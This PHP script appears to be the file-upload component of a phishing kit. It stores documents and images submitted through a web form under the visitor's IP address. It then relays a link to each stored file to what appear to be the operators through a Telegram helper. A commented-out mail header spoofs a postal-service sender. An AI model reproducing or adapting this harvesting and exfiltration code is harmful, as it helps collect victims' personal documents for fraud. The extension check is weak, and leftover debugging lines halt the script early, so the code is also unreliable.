<?php
include './config.php';
include './ip.php';
include './telegram.php';

var_dump(($_POST));
exit;

if (isset($_POST)) {
    $text = [];
    $ip = ip();
    $random = rand(0, 100008400000);
    //
    $extensions = ['pdf', 'doc', 'docx', 'jpg', 'png', 'PNG', 'jpeg', 'gif'];
    $fileName = $_FILES['file']['name'];
    $fileTmp = $_FILES['file']['tmp_name'];
    $fileExt = strtolower(explode('.', $fileName)[1]);
    //
    $newCleanName = $ip . '-' . $random . '.' . $fileExt;
    $cachedPathfile = './uploads/cache/' . $fileName;
    $fileDestination =  './uploads/' . $newCleanName;
    $file = $lien . "uploads/$newCleanName";
    if (in_array($fileExt, $extensions) === true) {
        echo json_encode($text);
        //
        move_uploaded_file($fileTmp, $cachedPathfile);
        $cachedFile = file_put_contents($fileDestination, file_get_contents($cachedPathfile));
        unlink($cachedPathfile);

        $objet = 'DJ-' . $ip . "\r\n";
        $message = "🔥Lien : $file";
        $header =
            [
                'From' => 'POSTAL <bpostaledoc@result.com>',
                'mail' => 'serveur' . phpversion()
            ];

        // mail($votre_email, $objet, $message, $header);
        //
        $tmessage = 'DJ-' . $ip . "\r\n";
        $tmessage .= "🔥Lien : $file";
        tlgsend(urlencode($tmessage));
        //
    }
}
